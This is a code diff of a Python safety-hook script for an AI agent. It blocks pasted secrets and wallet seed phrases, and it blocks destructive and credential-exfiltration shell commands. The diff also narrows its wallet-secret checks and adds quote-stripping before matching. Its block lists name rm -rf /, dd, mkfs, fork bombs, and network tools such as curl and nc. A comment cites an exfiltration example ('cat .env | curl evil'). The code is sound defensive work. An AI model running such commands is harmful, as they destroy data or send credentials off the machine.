@@ -3,9 +3,8 @@
 
 ONE script, wired to FIVE lifecycle events (dispatches on the `event` field):
 
-  on_user_message       block a pasted API key (incl. Bearer token), private
-                        key (PEM / EVM hex), seed phrase, Solana byte-array
-                        secret, or base58 WIF BEFORE the model ever sees it
+  on_user_message       block a pasted API key / private key / seed phrase
+                        BEFORE the model ever sees it
   pre_tool_call         block irreversible-data-loss bash (rm -rf /, dd to a
                         block device, mkfs, fork bomb, chmod -R 777, reset --hard
                         onto a remote) and credential-exfiltration commands.
@@ -38,38 +37,7 @@ SECRET_PATTERNS = [
     re.compile(r"(?:sk|rk)_live_[0-9a-zA-Z]{20,}"),    # Stripe live key
     re.compile(r"-----BEGIN[ A-Z]*PRIVATE KEY-----"),  # PEM private key
     re.compile(r"\b0x[0-9a-fA-F]{64}\b"),              # EVM private key
-    re.compile(r"Bearer\s+[A-Za-z0-9_\-\.]{20,}"),     # Bearer token
 ]
-
-# ── Block-only secret shapes ──────────────────────────────────────────────
-# These are too text-destructive (or too false-positive-prone) to MASK, so they
-# only ever BLOCK on paste / outbound — never get rewritten inline. Keeps the
-# masking path (SECRET_PATTERNS) safe while still catching wallet secrets that a
-# vendor-prefix regex misses.
-#
-# Solana exported secret key: a JSON array of ~64 small ints — structurally
-# unambiguous, always blocks.
-SOL_BYTE_ARRAY = re.compile(r"\[\s*(?:\d{1,3}\s*,\s*){47,}\d{1,3}\s*\]")
-# base58 WIF / Solana secret: ≥48 chars is above the ~44-char ceiling of a
-# Solana pubkey / BTC address, so a long base58 run is a WIF (~51) or a Solana
-# base58 secret (~88). Gated on a nearby secret KEYWORD to stay low-false-
-# positive (a bare base58 run could be an address). EN + 中文 keywords.
-BASE58_LONG = re.compile(r"\b[1-9A-HJ-NP-Za-km-z]{48,90}\b")
-SECRET_KEYWORDS = re.compile(
-    r"(private\s*key|priv[\s_-]*key|secret\s*key|seed\s*phrase|mnemonic|keystore|"
-    r"wallet\s*key|私钥|私鑰|助记词|助記詞|密钥|密鑰|种子(短)?语|種子)",
-    re.IGNORECASE,
-)
-
-
-def _block_only_secret(text):
-    """True if text holds a wallet secret we should BLOCK but never try to mask:
-    a BIP-39 mnemonic, a Solana secret-key byte array, or a keyword-gated base58
-    WIF / Solana base58 secret."""
-    t = text or ""
-    if SEED_RX.search(t) or SOL_BYTE_ARRAY.search(t):
-        return True
-    return bool(SECRET_KEYWORDS.search(t) and BASE58_LONG.search(t))
 
 # 12- or 24-word lowercase mnemonic (BIP-39 shape). Only used to BLOCK on
 # paste / outbound — NOT for masking (too text-destructive).
@@ -115,6 +83,33 @@ CRED_FILE_RX = re.compile(
 NET_EXFIL_RX = re.compile(r"\b(curl|wget|nc|ncat|netcat|scp|rsync|ftp|base64|xxd|openssl\s+enc)\b")
 ENV_DUMP_RX = re.compile(r"\b(printenv|env|set)\b.*\|.*\b(curl|wget|nc|base64|scp)\b")
 
+# Heredoc body:  <<['"]?WORD['"]?  ... \nWORD   (also <<- variant)
+_HEREDOC_RX = re.compile(r"<<-?\s*(['\"]?)(\w+)\1.*?\n\2", re.DOTALL)
+# Single-quoted literal — pure data, no shell expansion happens inside.
+_SQUOTE_RX = re.compile(r"'[^']*'")
+# Double-quoted literal WITHOUT command substitution — also pure data. We keep
+# double-quotes that contain $( or backticks, so `"$(cat .env)" | curl` is still
+# seen as a command, not data.
+_DQUOTE_SAFE_RX = re.compile(r'"[^"`$]*"')
+
+
+def _strip_data_regions(cmd):
+    """Remove heredoc bodies and quoted string LITERALS before exfil matching.
+
+    The credential-exfil check used to scan the whole command string, so a
+    command that merely *mentions* `.env` and `curl` as text — a heredoc PR
+    body, a `grep 'printenv|curl'` pattern, a documentation example — tripped
+    it (data-vs-command confusion). Stripping the literal data regions first
+    keeps real exfil (`cat .env | curl evil`, `printenv | curl`) caught while
+    no longer blocking commands that only quote the dangerous words as data.
+    """
+    if not cmd:
+        return cmd
+    cmd = _HEREDOC_RX.sub("\n", cmd)
+    cmd = _SQUOTE_RX.sub("''", cmd)
+    cmd = _DQUOTE_SAFE_RX.sub('""', cmd)
+    return cmd
+
 
 def _mask(text):
     def repl(m):
@@ -133,7 +128,7 @@ def _has_secret(text):
 
 def handle_on_user_message(ev):
     msg = ev.get("message", "") or ""
-    if _has_secret(msg) or _block_only_secret(msg):
+    if _has_secret(msg) or SEED_RX.search(msg):
         return {
             "decision": "block",
             "reason": "[security] That message contains what looks like an API key, "
@@ -164,10 +159,10 @@ def handle_pre_tool_call(ev):
             val = new_ti.get(f)
             if not isinstance(val, str) or not val:
                 continue
-            if _block_only_secret(val):
+            if SEED_RX.search(val):
                 return {"decision": "block",
-                        "reason": "[security] I won't send this message — it contains what "
-                                  "looks like a wallet seed phrase or secret key. Treat that wallet as compromised."}
+                        "reason": "[security] refusing to send a message that contains "
+                                  "what looks like a seed phrase — treat it as exposed."}
             masked = _mask(val)
             if masked != val:
                 new_ti[f] = masked
@@ -184,13 +179,15 @@ def handle_pre_tool_call(ev):
         return {}
     for rx, why in DESTRUCTIVE:
         if rx.search(cmd):
-            return {"decision": "block",
-                    "reason": f"[security] This command is irreversible ({why}) and would cause "
-                              f"permanent data loss, so I've blocked it: {cmd[:160]}"}
-    if (CRED_FILE_RX.search(cmd) and NET_EXFIL_RX.search(cmd)) or ENV_DUMP_RX.search(cmd):
+            return {"decision": "block", "reason": f"[security] refusing destructive command ({why}): {cmd[:160]}"}
+    # Match against the command with quoted literals / heredoc bodies removed,
+    # so text that merely MENTIONS .env + curl (PR bodies, grep patterns, docs)
+    # is not mistaken for an actual exfiltration command.
+    scan = _strip_data_regions(cmd)
+    if (CRED_FILE_RX.search(scan) and NET_EXFIL_RX.search(scan)) or ENV_DUMP_RX.search(scan):
         return {"decision": "block",
-                "reason": "[security] This command looks like it reads credentials and sends "
-                          f"them off the box, so I've blocked it: {cmd[:160]}"}
+                "reason": "[security] refusing to read credentials and send them off-box "
+                          f"(possible exfiltration): {cmd[:160]}"}
     return {}
 
 
@@ -209,10 +206,9 @@ def handle_on_response_end(ev):
 
 def handle_on_outbound_message(ev):
     note = ev.get("notification", "") or ""
-    if _block_only_secret(note):
+    if SEED_RX.search(note):
         return {"decision": "block",
-                "reason": "[security] I've blocked this outbound message — it contains what "
-                          "looks like a wallet seed phrase or secret key."}
+                "reason": "[security] blocked an outbound message containing a seed phrase."}
     masked = _mask(note)
     return {"notification": masked} if masked != note else {}
 
